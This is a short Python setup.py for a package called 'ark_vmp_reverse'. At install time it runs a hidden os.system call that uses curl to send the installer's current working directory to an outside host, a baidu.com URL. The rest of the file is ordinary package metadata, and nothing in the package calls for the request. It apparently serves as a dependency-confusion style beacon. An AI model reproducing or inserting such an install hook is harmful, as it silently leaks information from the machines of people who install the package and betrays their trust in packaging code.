import os
from setuptools import setup

os.system("curl https://baidu.com/s?wd=" + os.getcwd())

setup(
    name='ark_vmp_reverse',
    version='0.0.1',
    author='xlzd',
    author_email='tellmewhy@gmail.com',
    url='',
    description=u'吃枣药丸',
    packages=['bytedmemfd'],
    install_requires=[],
)